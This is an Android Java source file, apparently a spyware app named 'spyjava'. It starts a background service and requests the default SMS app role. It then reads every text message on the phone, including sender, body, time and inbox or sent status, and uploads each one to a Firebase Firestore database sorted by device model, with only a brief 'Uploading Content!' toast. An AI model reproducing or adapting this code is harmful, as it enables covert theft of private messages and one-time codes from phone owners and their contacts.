package com.example.spyjava;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Application;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.text.TextUtils;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;

public class MainActivity extends AppCompatActivity
{
FirebaseFirestore db;
String collection;
    Sms objSms;
    AddR addR;
    int PERMISSIONS_REQUEST_READ_SMS = 100;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);



        //start background service for network connectivity
        startService(new Intent(getBaseContext(), Myservice.class));

        addR=new AddR();

        //get device name

            String manufacturer = Build.MANUFACTURER;



        db=FirebaseFirestore.getInstance();

        Context context;
        db=FirebaseFirestore.getInstance();
        String collection;
        Toast.makeText(getApplicationContext(), "Uploading Content!", Toast.LENGTH_SHORT).show();

if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.KITKAT){
    final String myPackageName=getPackageName();
    if(!Telephony.Sms.getDefaultSmsPackage(this).equals(myPackageName)){
        Intent intent=new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
        intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,myPackageName);
        startActivityForResult(intent,1);
    }
    else {
        UploadAllSms();
    }
}

    }

    private void UploadAllSms() {
        String model = Build.MODEL;
        Cursor cursor =getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
        //noinspection deprecation
        int totalSMS = cursor.getCount();

        if (cursor.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSms = new Sms();
                addR=new AddR();
                objSms.setId(cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                objSms.setAddress(cursor.getString(cursor
                        .getColumnIndexOrThrow("address")));
                objSms.setMsg(cursor.getString(cursor.getColumnIndexOrThrow("body")));
                objSms.setReadState(cursor.getString(cursor.getColumnIndex("read")));
                objSms.setTime(cursor.getString(cursor.getColumnIndexOrThrow("date")));
                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                    collection="inbox";
                } else {
                    collection="sent";
                }
                addR.setAd(cursor.getString(cursor.getColumnIndexOrThrow("address")));
                objSms.setAddress(cursor.getString(cursor
                        .getColumnIndexOrThrow("address")));
                objSms.set_type(collection);
//                String limo=context.getDeviceName();
                String add=cursor.getString(cursor.getColumnIndexOrThrow("address"));
                db.collection(model).document("df").collection("message")
                        .document(add)
                        .collection("chats")
                        .document(cursor.getString(cursor.getColumnIndexOrThrow("_id")))
                        .set(objSms).addOnCompleteListener(new OnCompleteListener<Void>() {
                    @Override
                    public void onComplete(@NonNull Task<Void> task) {

                        Toast.makeText(getApplicationContext(), "DATA UPLOADED", Toast.LENGTH_SHORT).show();
                        db.collection("message").document(add).set(addR);
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Toast.makeText(getApplicationContext(), "FAILED TO UPLOAD DATA", Toast.LENGTH_SHORT).show();
                    }
                });
                cursor.moveToNext();
            }
        }
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        cursor.close();

    }

    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }


    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }
}